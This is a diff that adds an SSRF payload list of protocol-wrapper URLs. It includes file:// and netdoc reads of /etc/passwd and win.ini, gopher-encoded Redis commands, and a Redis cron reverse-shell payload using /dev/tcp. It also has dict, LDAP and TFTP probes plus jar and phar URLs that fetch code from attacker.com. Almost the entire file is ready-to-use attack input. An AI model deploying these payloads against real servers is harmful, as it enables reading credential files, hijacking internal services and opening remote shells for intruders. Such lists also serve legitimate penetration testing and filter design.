@@ -1,0 +1,46 @@
+# SSRF Protocol Wrappers
+
+# ============ File protocol ============
+file:///etc/passwd
+file://localhost/etc/passwd
+file://127.0.0.1/etc/passwd
+file:///c:/windows/win.ini
+
+# ============ Gopher protocol (powerful!) ============
+# HTTP GET request
+gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a
+
+# Redis commands
+gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a
+gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$3%0d%0akey%0d%0a$5%0d%0avalue%0d%0a
+
+# Redis reverse shell (cron)
+gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/IP/PORT 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
+
+# MySQL query (no auth)
+gopher://127.0.0.1:3306/_<mysql_packet>
+
+# FastCGI/PHP-FPM RCE
+gopher://127.0.0.1:9000/_<fastcgi_packet>
+
+# ============ Dict protocol ============
+dict://127.0.0.1:6379/info
+dict://127.0.0.1:11211/stats
+
+# ============ TFTP protocol ============
+tftp://attacker.com/file
+
+# ============ LDAP protocol ============
+ldap://attacker.com/
+ldaps://attacker.com/
+ldap://attacker.com/%0astats%0aquit
+
+# ============ Jar protocol (Java) ============
+jar:http://attacker.com/evil.jar!/
+
+# ============ Netdoc (Java) ============
+netdoc:///etc/passwd
+
+# ============ PHP specific ============
+php://filter/convert.base64-encode/resource=http://127.0.0.1/
+phar://attacker.com/evil.phar
